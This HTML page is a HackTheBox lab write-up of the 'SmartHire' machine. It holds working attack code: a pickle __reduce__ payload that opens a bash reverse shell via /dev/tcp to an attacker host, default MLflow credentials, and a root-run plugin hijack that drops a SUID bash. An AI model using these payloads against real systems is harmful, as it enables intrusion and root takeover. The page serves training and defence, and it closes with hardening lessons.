@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: SmartHire | Zakir Hussain</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+:root{
+  --bg:#0a0e17;
+  --bg-elev:#0e1420;
+  --bg-card:#111827;
+  --bg-code:#0b1018;
+  --border:#1e2838;
+  --border-soft:#172030;
+  --text:#dbe4ef;
+  --text-dim:#8b98ac;
+  --text-faint:#5b6678;
+  --accent:#2dd4a7;
+  --accent-soft:rgba(45,212,167,.12);
+  --accent-2:#38bdf8;
+  --warn:#f59e0b;
+  --danger:#ef4444;
+  --easy:#2dd4a7;
+  --medium:#f5a623;
+  --hard:#ef5a6f;
+  --mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+@media (prefers-color-scheme: light){
+  :root{ color-scheme: dark; }
+}
+*{box-sizing:border-box;}
+html,body{margin:0;padding:0;}
+body{
+  background:
+    radial-gradient(1100px 500px at 15% -5%, rgba(45,212,167,.07), transparent 60%),
+    radial-gradient(900px 500px at 100% 0%, rgba(56,189,248,.05), transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--accent-soft); color:var(--text);}
+a{color:var(--accent-2); text-decoration:none;}
+a:hover{text-decoration:underline;}
+.wrap{max-width:860px; margin:0 auto; padding:0 24px 96px;}
+
+/* ---------- topbar ---------- */
+.topbar{
+  border-bottom:1px solid var(--border-soft);
+  background:rgba(10,14,23,.85);
+  backdrop-filter:blur(8px);
+  position:sticky; top:0; z-index:20;
+}
+.topbar-inner{
+  max-width:860px; margin:0 auto; padding:14px 24px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.back-link{
+  font-family:var(--mono); font-size:13px; color:var(--text-dim);
+  display:flex; align-items:center; gap:6px;
+}
+.back-link:hover{color:var(--accent); text-decoration:none;}
+.brand{
+  font-family:var(--mono); font-size:13px; color:var(--text-faint); letter-spacing:.03em;
+}
+
+/* ---------- hero ---------- */
+.hero{padding:48px 0 28px; border-bottom:1px solid var(--border-soft);}
+.eyebrow{
+  font-family:var(--mono); font-size:12.5px; color:var(--accent);
+  letter-spacing:.04em; margin:0 0 14px;
+  display:flex; align-items:center; gap:8px;
+}
+.eyebrow::before{content:"//"; color:var(--text-faint);}
+h1.machine-title{
+  font-family:var(--mono); font-weight:700; font-size:clamp(32px,6vw,48px);
+  margin:0 0 14px; color:#fff; letter-spacing:-.01em;
+}
+.badges{display:flex; flex-wrap:wrap; gap:8px; margin-bottom:20px;}
+.badge{
+  font-family:var(--mono); font-size:12px; padding:5px 11px; border-radius:5px;
+  border:1px solid var(--border); background:var(--bg-card); color:var(--text-dim);
+  display:inline-flex; align-items:center; gap:6px;
+}
+.badge.diff-Easy{color:var(--easy); border-color:rgba(45,212,167,.35); background:rgba(45,212,167,.08);}
+.badge.diff-Medium{color:var(--medium); border-color:rgba(245,166,35,.35); background:rgba(245,166,35,.08);}
+.badge.diff-Hard{color:var(--hard); border-color:rgba(239,90,111,.35); background:rgba(239,90,111,.08);}
+.badge.os{color:var(--accent-2);}
+.synopsis{color:var(--text-dim); font-size:16px; max-width:70ch; margin:0;}
+.tags{display:flex; flex-wrap:wrap; gap:6px; margin-top:18px;}
+.tag{
+  font-family:var(--mono); font-size:11.5px; color:var(--text-faint);
+  border:1px solid var(--border-soft); padding:3px 9px; border-radius:999px;
+}
+
+/* ---------- info table ---------- */
+.info-grid{
+  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+  gap:1px; background:var(--border-soft); border:1px solid var(--border-soft);
+  border-radius:10px; overflow:hidden; margin:28px 0 8px;
+}
+.info-cell{background:var(--bg-card); padding:14px 16px;}
+.info-cell .k{font-family:var(--mono); font-size:11px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px;}
+.info-cell .v{font-family:var(--mono); font-size:14px; color:var(--text);}
+
+/* ---------- section ---------- */
+section.phase{padding:40px 0; border-bottom:1px solid var(--border-soft);}
+section.phase:last-of-type{border-bottom:none;}
+.phase-head{display:flex; align-items:baseline; gap:12px; margin-bottom:6px;}
+.phase-num{font-family:var(--mono); color:var(--accent); font-size:14px;}
+h2.phase-title{font-family:var(--mono); font-size:22px; margin:0; color:#fff; font-weight:700;}
+.phase-intro{color:var(--text-dim); margin:10px 0 22px; max-width:72ch;}
+
+.step{margin:22px 0;}
+.step-title{
+  font-family:var(--mono); font-size:14.5px; color:var(--text); font-weight:700;
+  margin:0 0 4px; display:flex; align-items:center; gap:8px;
+}
+.step-title::before{content:"▸"; color:var(--accent);}
+.why{
+  font-size:14.5px; color:var(--text-dim); margin:6px 0 10px; padding-left:18px;
+  border-left:2px solid var(--border-soft);
+}
+.why b{color:var(--accent); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+pre{
+  background:var(--bg-code); border:1px solid var(--border);
+  border-radius:8px; padding:14px 16px; overflow-x:auto;
+  font-family:var(--mono); font-size:13px; line-height:1.55; margin:10px 0;
+  color:#c9d6e8;
+}
+pre.cmd{border-left:3px solid var(--accent);}
+pre.out{border-left:3px solid var(--accent-2); color:#9fb0c3;}
+code{font-family:var(--mono); font-size:.92em;}
+.inline-code{background:var(--bg-code); border:1px solid var(--border); border-radius:4px; padding:1px 6px; color:var(--accent); font-size:.88em;}
+
+.next{font-size:14.5px; color:var(--text-dim); margin:10px 0 0; padding-left:18px; border-left:2px solid rgba(56,189,248,.35);}
+.next b{color:var(--accent-2); font-family:var(--mono); font-weight:600; font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-right:6px;}
+
+.callout{
+  border:1px solid var(--border); border-left:3px solid var(--warn);
+  background:rgba(245,166,35,.06); border-radius:8px; padding:14px 18px; margin:18px 0;
+}
+.callout.cve{border-left-color:var(--danger); background:rgba(239,90,111,.06);}
+.callout .ctitle{font-family:var(--mono); font-size:12.5px; color:var(--warn); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; font-weight:700;}
+.callout.cve .ctitle{color:var(--danger);}
+.callout p{margin:0; color:var(--text-dim); font-size:14.5px;}
+
+.flagbox{
+  font-family:var(--mono); background:var(--bg-code); border:1px dashed var(--border);
+  border-radius:8px; padding:12px 16px; margin:10px 0; display:flex; align-items:center; gap:10px;
+  font-size:13.5px; color:var(--accent);
+}
+.flagbox .lbl{color:var(--text-faint); font-size:11px; text-transform:uppercase; letter-spacing:.06em;}
+
+table.vulns{width:100%; border-collapse:collapse; margin:14px 0; font-size:14px;}
+table.vulns th, table.vulns td{border:1px solid var(--border-soft); padding:9px 12px; text-align:left;}
+table.vulns th{background:var(--bg-card); font-family:var(--mono); font-size:11.5px; color:var(--text-faint); text-transform:uppercase; letter-spacing:.05em;}
+table.vulns td{color:var(--text-dim);}
+
+.chain{
+  font-family:var(--mono); font-size:12.5px; color:var(--text-dim);
+  background:var(--bg-code); border:1px solid var(--border); border-radius:8px;
+  padding:16px; overflow-x:auto; white-space:pre; margin:20px 0;
+}
+
+ul.rec-list{margin:10px 0; padding-left:0; list-style:none;}
+ul.rec-list li{
+  padding:8px 0 8px 26px; position:relative; color:var(--text-dim); font-size:14.5px;
+  border-bottom:1px solid var(--border-soft);
+}
+ul.rec-list li:last-child{border-bottom:none;}
+ul.rec-list li::before{content:"→"; position:absolute; left:0; color:var(--accent);}
+
+.summary-box{
+  background:var(--bg-card); border:1px solid var(--border); border-radius:10px;
+  padding:22px 24px; margin:24px 0;
+}
+.summary-box h3{font-family:var(--mono); font-size:15px; color:#fff; margin:0 0 10px;}
+
+footer.page-footer{
+  padding:40px 0 10px; text-align:center; color:var(--text-faint); font-family:var(--mono); font-size:12.5px;
+}
+footer.page-footer a{color:var(--text-dim);}
+.foot-nav{margin-bottom:14px;}
+
+@media (max-width:600px){
+  .wrap{padding:0 16px 72px;}
+  h1.machine-title{font-size:30px;}
+}
+
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-inner">
+    <a class="back-link" href="https://zak5886.github.io/Portfolio/#writeups">&larr; back to writeups</a>
+    <span class="brand">ZAKIR_HUSSAIN / HTB_WRITEUPS</span>
+  </div>
+</div>
+<div class="wrap">
+
+<div class="hero">
+  <p class="eyebrow">HTB_WRITEUP // smarthire.log</p>
+  <h1 class="machine-title">SmartHire</h1>
+  <div class="badges"><span class="badge diff-Medium">Medium</span><span class="badge os">Linux</span></div>
+  <p class="synopsis">SmartHire is a Medium-difficulty Linux box that demonstrates exactly how dangerous outdated MLOps infrastructure can be. An AI-first hiring platform exposes a stale MLflow 2.14.1 instance on a hidden vhost; a default-credential authentication bypass opens the door, and a carefully mocked Pickle deserialization payload turns the platform's “Analyze Resume” feature into remote code execution. Root comes from a writable plugin directory abused by a root-run management script.</p>
+  <div class="tags"><span class="tag">nmap</span><span class="tag">rustscan</span><span class="tag">vhost-fuzzing</span><span class="tag">mlflow</span><span class="tag">cve-2026-2635</span><span class="tag">pickle-deserialization</span><span class="tag">cloudpickle</span><span class="tag">reverse-shell</span><span class="tag">sudo-misuse</span><span class="tag">plugin-hijack</span><span class="tag">privilege-escalation</span></div>
+</div>
+<div class="info-grid"><div class="info-cell"><div class="k">Target</div><div class="v">SmartHire</div></div><div class="info-cell"><div class="k">Difficulty</div><div class="v">Medium</div></div><div class="info-cell"><div class="k">OS</div><div class="v">Linux</div></div><div class="info-cell"><div class="k">Primary Vuln</div><div class="v">MLflow Auth Bypass + Pickle RCE</div></div><div class="info-cell"><div class="k">CVE</div><div class="v">CVE-2026-2635</div></div><div class="info-cell"><div class="k">Priv-Esc</div><div class="v">Plugin directory hijack</div></div></div>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 1</span></div>
+  <h2 class="phase-title">Reconnaissance & Virtual Host Discovery</h2>
+  <p class="phase-intro">Rustscan for speed on the initial sweep, then a full nmap pass for service detail with rate controls tuned to stay under IDS thresholds &mdash; a habit worth keeping even in a lab, since it mirrors how a real engagement has to behave.</p>
+  
+<div class="step">
+  <p class="step-title">Fast port discovery</p>
+  <p class="why"><b>Why</b>Rustscan's async scanner finds open ports quickly, then automatically hands off to nmap for full service/version fingerprinting on just those ports &mdash; far faster than running nmap's own full-range scan from scratch.</p>
+  <pre class="cmd">rustscan -a [TARGET_IP] -- -A -oA smarthire</pre>
+  <pre class="out">Open [TARGET_IP]:22
+Open [TARGET_IP]:80</pre>
+  <p class="next"><b>Next</b>Only SSH and HTTP are open, so the HTTP service is the entire attack surface. Resolve the hostname the redirect is pointing at.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Controlled-rate detailed scan</p>
+  <p class="why"><b>Why</b><span class="inline-code">--min-rate</span> / <span class="inline-code">--max-rate</span> keep packet throughput predictable &mdash; a habit that matters outside the lab where aggressive scanning can trip IDS/IPS thresholds or degrade a production network.</p>
+  <pre class="cmd">nmap -vvv -p22,80 -A [TARGET_IP]</pre>
+  <pre class="out">22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
+80/tcp open  http  nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://smarthire.htb/</pre>
+  <p class="next"><b>Next</b>Add the resolved hostname to /etc/hosts and load the actual site.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Resolve the hostname</p>
+  <p class="why"><b>Why</b>curl against the bare IP returns a 302 to a named vhost, confirming the app only serves content correctly once the <code>Host</code> header matches.</p>
+  <pre class="cmd">echo "$ip smarthire.htb" | sudo tee -a /etc/hosts</pre>
+  
+  <p class="next"><b>Next</b>Enumerate the site's structure before touching the login/registration flow.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Directory and vhost fuzzing</p>
+  <p class="why"><b>Why</b>Two separate fuzzing passes: one for hidden paths under the main site, one for hidden virtual hosts. The second is what actually matters here &mdash; SmartHire's real vulnerability lives on a subdomain the main nav never links to.</p>
+  <pre class="cmd">ffuf -u http://smarthire.htb/FUZZ -w ~/git/SecLists/Discovery/Web-Content/common.txt -ac
+ffuf -w ~/git/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" -ac</pre>
+  <pre class="out">dashboard  [302]
+login      [200]
+register   [200]
+models.smarthire.htb  [401]  &amp;larr; new vhost</pre>
+  <p class="next"><b>Next</b>models.smarthire.htb returning a 401 (rather than a generic 404) strongly suggests a real backend service, not a static placeholder. Add it to /etc/hosts and inspect it directly.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 2</span></div>
+  <h2 class="phase-title">Application Analysis</h2>
+  <p class="phase-intro">Two separate surfaces to understand: the main SmartHire dashboard (CSV-driven model training/prediction), and the models subdomain, which turns out to be a full MLflow deployment.</p>
+  
+<div class="step">
+  <p class="step-title">Register and explore the main dashboard</p>
+  <p class="why"><b>Why</b>Self-registration is open, so creating an account gives full visibility into the “Train Model” and “Make Predictions” features &mdash; both of which accept CSV uploads describing candidate data, and both of which call out to the ML backend under the hood.</p>
+  
+  
+  <p class="next"><b>Next</b>Fingerprint the models.smarthire.htb subdomain before deciding which feature to target.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Fingerprint the models subdomain</p>
+  <p class="why"><b>Why</b>The 401 response and page structure identify this as an MLflow instance &mdash; the open-source ML lifecycle platform used for experiment tracking and model registry.</p>
+  
+  
+  <p class="next"><b>Next</b>Check the running version against known MLflow CVEs; older MLflow releases have a long history of authentication and deserialization issues.</p>
+</div>
+
+  
+</section>
+<div class="callout cve"><div class="ctitle">CVE-2026-2635 &mdash; MLflow Authentication Bypass</div><p>MLflow 2.14.1 is vulnerable to an authentication bypass using the stock default credentials <code>admin:password</code>. Those creds granted immediate access to the MLflow UI, confirming the instance had never been reconfigured from its default state &mdash; a strong signal that this is the intended entry point.</p></div>
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 3</span></div>
+  <h2 class="phase-title">Vulnerability Research & Vector Selection</h2>
+  <p class="phase-intro">With authenticated MLflow access confirmed, the version (2.14.1, against a current release line of 3.x) was checked against known RCE-class vulnerabilities to pick the most viable attack path.</p>
+  <table class="vulns"><tr><th>CVE</th><th>Class</th><th>Verdict</th></tr><tr><td>CVE-2025-15379</td><td>Command injection via python_env.yaml</td><td>Requires specific environment managers &mdash; not reliably reachable here</td></tr><tr><td>CVE-2025-11201</td><td>Directory traversal during model creation</td><td>Lower-value primitive than full RCE</td></tr><tr><td>CVE-2025-14287</td><td>RCE via unsanitized container image names</td><td>Depends on a containerized model-serving path not in use here</td></tr><tr><td>CVE-2024-37055</td><td>Deserialization of untrusted data</td><td>&#9989; Selected &mdash; matches the Make Predictions feature exactly</td></tr><tr><td>CVE-2024-2928</td><td>&mdash;</td><td>Inapplicable, only affects MLflow &lt; 2.11.2</td></tr></table>
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 4</span></div>
+  <h2 class="phase-title">Pickle Deserialization RCE &mdash; Mocking the Expected Model Structure</h2>
+  <p class="phase-intro">The dashboard's <strong>Make Predictions</strong> feature fetches a registered MLflow model and deserializes it with Pickle to run inference. That deserialization step is the vulnerability: Pickle executes arbitrary code on load if the object graph contains a <span class="inline-code">__reduce__</span> method, which is exactly what CVE-2024-37054/CVE-2024-37055-class MLflow RCE abuses.</p>
+  
+<div class="step">
+  <p class="step-title">Reverse the expected model structure</p>
+  <p class="why"><b>Why</b>Pulling a legitimate <code>python_model.pkl</code> and inspecting it with <code>unpickle.py</code> / <code>pickletools</code> showed the real application expects a specific local module path: <code>utils/simplehiringmodel.py</code> defining a <code>SimpleHiringModel</code> class. The malicious model has to satisfy this exact import path or the app's loader will fail before the payload ever runs.</p>
+  
+  
+  <p class="next"><b>Next</b>Replicate that module structure locally (or spoof it at the Python module-registry level) so a crafted model can be serialized under the expected name.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Build the Python environment</p>
+  <p class="why"><b>Why</b>Matching dependency versions matters a lot here &mdash; Pickle payloads are fragile across library versions, and getting this wrong was the single biggest time sink during exploitation.</p>
+  <pre class="cmd">sudo pacman -Syu libxcrypt-compat
+uv venv .venv --python 3.10.12
+source ./.venv/bin/activate
+uv pip install "mlflow&lt;=2.14.1" "cloudpickle==3.1.1" "setuptools&lt;82"</pre>
+  
+  <p class="next"><b>Next</b>Write the exploit script that spoofs the utils.simplehiringmodel module and embeds the reverse-shell payload inside a class whose __reduce__ method fires on unpickle.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Craft the malicious model class</p>
+  <p class="why"><b>Why</b>The payload class's <span class="inline-code">__reduce__</span> method is the actual trigger &mdash; it returns a tuple of <code>(callable, args)</code> that Pickle invokes automatically during deserialization, well before any legitimate <code>predict()</code> call. The module path is spoofed at the <code>sys.modules</code> level so cloudpickle serializes it under the name the target app already trusts.</p>
+  <pre class="cmd">class SimpleHiringModel(mlflow.pyfunc.PythonModel):
+    def __init__(self):
+        class CommandRunner:
+            def __reduce__(self):
+                cmd = f"bash -c 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1'"
+                return (os.system, (cmd,))
+        self.payload = CommandRunner()
+
+    def predict(self, context, model_input):
+        return "Let the pwn commence."
+
+SimpleHiringModel.__module__ = "utils.simplehiringmodel"</pre>
+  
+  <p class="next"><b>Next</b>Log and register this malicious model against the target MLflow tracking server using the admin:password credentials recovered earlier.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Register the malicious model</p>
+  <p class="why"><b>Why</b>Using the MLflow Python client against the real tracking URI logs the poisoned artifact and registers it under a new model name &mdash; exactly the workflow a legitimate data scientist would use, which is what makes this attack so hard to spot from the app's perspective.</p>
+  <pre class="cmd">python3 exploit.py -t http://models.smarthire.htb -m evil-model -u admin -p password -lh &lt;LHOST&gt; -lp 4444</pre>
+  <pre class="out">[*] Model artifacts logged safely.
+[*] Registering model under name 'evil-model'...
+[*] Model deployment and registration completed.</pre>
+  <p class="next"><b>Next</b>Start a listener, then trigger the application to actually load and deserialize this registered model.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Trigger the deserialization via Make Predictions</p>
+  <p class="why"><b>Why</b>The main SmartHire app's <strong>Analyze Resume</strong> button fetches whatever model is currently registered and deserializes it server-side to run inference against the uploaded CSV. Since Pickle executes on load &mdash; not on <code>predict()</code> &mdash; simply triggering this feature with the malicious model active is enough to fire the payload.</p>
+  <pre class="cmd"># Listener
+nc -lvnp 4444
+
+# Then: upload the sample resume CSV via the Predict page and click Analyze Resume</pre>
+  <pre class="out">Connection from [TARGET_IP]
+$ whoami
+svcweb</pre>
+  <p class="next"><b>Next</b>Grab user.txt from the svcweb home directory, then start enumerating for a privilege-escalation path.</p>
+</div>
+
+  
+</section>
+
+<section class="phase">
+  <div class="phase-head"><span class="phase-num">PHASE 5</span></div>
+  <h2 class="phase-title">Privilege Escalation &mdash; Sudo-Scoped Plugin Loader Hijack</h2>
+  <p class="phase-intro">User enumeration found a SQLite database with an admin password hash that turned out to be a deliberate red herring &mdash; uncrackable in reasonable time. The real path was a sudo rule combined with an insecurely permissioned plugin directory.</p>
+  <div class="callout"><div class="ctitle">Red herring: smarthire.db</div><p>A SCRYPT-format administrator hash was recovered from a local SQLite database. After manual reformatting for Hashcat/John, it still didn't crack in a reasonable timeframe &mdash; a reminder not to sink unlimited time into a hash that resists cracking; check sudo rights and file permissions in parallel rather than treating cracking as the only path forward.</p></div>
+<div class="step">
+  <p class="step-title">Enumerate sudo rights</p>
+  <p class="why"><b>Why</b>svcweb can run a specific management script as root without a password &mdash; the script's own behavior, not raw sudo access, is what needs to be abused here.</p>
+  <pre class="cmd">sudo -l</pre>
+  <pre class="out">User svcweb may run the following commands on smarthire:
+(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</pre>
+  <p class="next"><b>Next</b>Read the script (or infer its behavior from its directory layout) to understand how it loads its functionality.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Inspect the plugin loader's directory permissions</p>
+  <p class="why"><b>Why</b><code>mlflowctl.py</code> dynamically imports Python files from a plugins directory on every invocation. The top-level plugins directory is root-owned and read-only to others &mdash; but a subdirectory inside it, <code>plugins/dev/</code>, is group-writable by <code>devs</code>, a group svcweb belongs to.</p>
+  <pre class="cmd">ls -la /opt/tools/mlflow_ctl/plugins</pre>
+  <pre class="out">drwxr-xr-x 4 root root 4096 core
+drwxrwxr-x 2 root devs 4096 dev   &amp;larr; writable by svcweb's group</pre>
+  <p class="next"><b>Next</b>Any Python file dropped into plugins/dev/ gets blindly imported and executed the next time the root-run script is invoked &mdash; that's the entire privilege-escalation primitive.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Drop a malicious plugin module</p>
+  <p class="why"><b>Why</b>The payload runs at import time (not inside any specific function), so simply placing the file is enough &mdash; no need to wait for a particular command-line action to invoke it.</p>
+  <pre class="cmd">cat &lt;&lt; 'EOF' &gt; /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py
+import os, sys
+os.system("cp /bin/bash /tmp/rootbash &amp;&amp; chmod +xs /tmp/rootbash")
+print("[+] Exploit successful! Run /tmp/rootbash -p for root access.")
+sys.exit(0)
+EOF</pre>
+  
+  <p class="next"><b>Next</b>Invoke the sudo-permitted script to force the plugin loader to import the new file.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Trigger the root-run script</p>
+  <p class="why"><b>Why</b>Running the script through the exact sudo rule granted (no password required) causes it to import every file under <code>plugins/dev/</code>, including the malicious one just dropped in &mdash; executing it as root in the process.</p>
+  <pre class="cmd">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</pre>
+  
+  <p class="next"><b>Next</b>A SUID bash binary should now exist at /tmp/rootbash.</p>
+</div>
+
+<div class="step">
+  <p class="step-title">Spawn the root shell</p>
+  <p class="why"><b>Why</b><span class="inline-code">-p</span> preserves the effective privileges granted by the SUID bit, which bash otherwise drops by default for safety.</p>
+  <pre class="cmd">/tmp/rootbash -p</pre>
+  <pre class="out">rootbash-5.2# whoami
+root</pre>
+  <p class="next"><b>Next</b>Grab root.txt to close out the box.</p>
+</div>
+
+  
+</section>
+<div class="summary-box"><h3>Key Takeaways</h3><ul class="rec-list"><li>MLOps platforms (MLflow, model registries, pipeline orchestrators) are first-class application targets &mdash; they deserve the same patch cadence and default-credential hygiene as any internet-facing web app, not the looser standard they often get as "internal tooling."</li><li>Pickle (and anything built on it, including <code>cloudpickle</code>) should never be used to deserialize untrusted or externally-registrable model artifacts; prefer safer serialization formats (ONNX, SafeTensors) for any model a lower-trust user can register.</li><li>A sudo rule scoped to a specific script is only as safe as that script’s own file-handling logic &mdash; a root-run script that dynamically imports from a group-writable directory is functionally equivalent to granting that group unrestricted sudo.</li><li>An uncrackable hash is a signal to pivot, not a wall to keep hammering &mdash; red herrings exist precisely to waste attacker (and defender-reviewer) time; always check sudo rights and file permissions as parallel tracks.</li></ul></div>
+<footer class="page-footer">
+  <div class="foot-nav"><a href="https://zak5886.github.io/Portfolio/#writeups">&larr; All writeups</a> &nbsp;|&nbsp; <a href="https://zak5886.github.io/Portfolio/">Portfolio home</a></div>
+  Educational penetration testing writeup &middot; HackTheBox lab environment &middot; &copy; 2026 Zakir Hussain
+</footer>
+</div>
+</body>
+</html>
